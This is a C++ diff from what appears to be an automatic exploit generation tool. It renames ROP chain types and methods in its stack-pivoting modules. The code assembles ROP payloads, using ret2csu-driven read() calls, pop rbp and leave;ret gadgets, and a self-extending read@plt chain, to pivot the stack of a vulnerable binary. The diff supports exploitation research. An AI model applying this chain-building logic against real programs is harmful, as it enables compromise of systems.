@@ -53,7 +53,7 @@ BasicStackPivoting::BasicStackPivoting() : StackPivoting() {
 
 
 
-std::vector<RopSubchain> BasicStackPivoting::getRopSubchains() const {
+std::vector<RopPayload> BasicStackPivoting::getRopPayloadList() const {
     const Exploit &exploit = g_crax->getExploit();
     const ELF &elf = exploit.getElf();
 
@@ -61,26 +61,26 @@ std::vector<RopSubchain> BasicStackPivoting::getRopSubchains() const {
     assert(ret2csu);
 
     // RBP
-    RopSubchain part1 = {
+    RopPayload part1 = {
         ConstantExpr::create(0, Expr::Int64)
     };
 
     // Write the 2nd stage ROP payload via read() to `pivot_dest`
     // via ret2csu(read, 0, pivot_dest, 1024).
-    RopSubchain part2 = ret2csu->getRopSubchains(
+    RopPayload part2 = ret2csu->getRopPayloadList(
         BaseOffsetExpr::create<BaseType::SYM>(elf, "read"),
         ConstantExpr::create(0, Expr::Int64),
         BaseOffsetExpr::create<BaseType::VAR>(elf, "pivot_dest"),
         ConstantExpr::create(1024, Expr::Int64))[0];
 
     // Perform stack pivoting.
-    RopSubchain part3 = {
+    RopPayload part3 = {
         BaseOffsetExpr::create<BaseType::VAR>(elf, Exploit::toVarName("pop rbp ; ret")),
         BaseOffsetExpr::create<BaseType::VAR>(elf, "pivot_dest"),
         BaseOffsetExpr::create<BaseType::VAR>(elf, Exploit::toVarName("leave ; ret"))
     };
 
-    RopSubchain ret;
+    RopPayload ret;
     ret.reserve(part1.size() + part2.size() + part3.size());
     ret.insert(ret.end(), part1.begin(), part1.end());
     ret.insert(ret.end(), part2.begin(), part2.end());
@@ -88,7 +88,7 @@ std::vector<RopSubchain> BasicStackPivoting::getRopSubchains() const {
     return { ret };
 }
 
-RopSubchain BasicStackPivoting::getExtraRopSubchain() const {
+RopPayload BasicStackPivoting::getExtraRopPayload() const {
     return { ConstantExpr::create(0, Expr::Int64) };  // RBP
 }
 
@@ -125,7 +125,7 @@ bool AdvancedStackPivoting::checkRequirements() const {
            m_readCallSites.size();
 }
 
-std::vector<RopSubchain> AdvancedStackPivoting::getRopSubchains() const {
+std::vector<RopPayload> AdvancedStackPivoting::getRopPayloadList() const {
     assert(m_readCallSites.size() &&
            "AdvancedStackPivoting requires at least one call site of read@libc");
 
@@ -141,7 +141,7 @@ std::vector<RopSubchain> AdvancedStackPivoting::getRopSubchains() const {
     // a huge read() via ret2csu. So here we'll build a self-extending ROP chain
     // which continuously calls read@plt until there's enough space to perform
     // ret2csu once.
-    RopSubchain part1;
+    RopPayload part1;
     for (size_t i = 0; i < 6; i++) {
         ref<Expr> e0 = BaseOffsetExpr::create<BaseType::VAR>(
                 elf, Exploit::toVarName("pop rsi ; pop r15 ; ret"));
@@ -175,7 +175,7 @@ std::vector<RopSubchain> AdvancedStackPivoting::getRopSubchains() const {
 
     // Now, we should have accumulated enough space to perform a huge read() via ret2csu.
     // read(0, target_base + pivot_dest + 0x30 * 7, 0x400).
-    RopSubchain part2 = ret2csu->getRopSubchains(
+    RopPayload part2 = ret2csu->getRopPayloadList(
             BaseOffsetExpr::create<BaseType::SYM>(elf, "read"),
             ConstantExpr::create(0, Expr::Int64),
             AddExpr::alloc(
@@ -189,16 +189,16 @@ std::vector<RopSubchain> AdvancedStackPivoting::getRopSubchains() const {
     // Symbolic ROP subchain
     // We're exploiting the overflow in libc's sys_read(),
     // so constraint solver isn't needed.
-    std::vector<RopSubchain> ret;
+    std::vector<RopPayload> ret;
     ret.push_back({});
 
     // Direct ROP subchain
     for (size_t i = 0; i < part1.size(); i += 6) {
-        ret.push_back(RopSubchain(part1.begin() + i, part1.begin() + i + 6));
+        ret.push_back(RopPayload(part1.begin() + i, part1.begin() + i + 6));
     }
     for (size_t i = 0; i < part2.size(); i += 6) {
         size_t end = std::min(i + 6, part2.size());
-        ret.push_back(RopSubchain(part2.begin() + i, part2.begin() + end));
+        ret.push_back(RopPayload(part2.begin() + i, part2.begin() + end));
     }
 
     return ret;
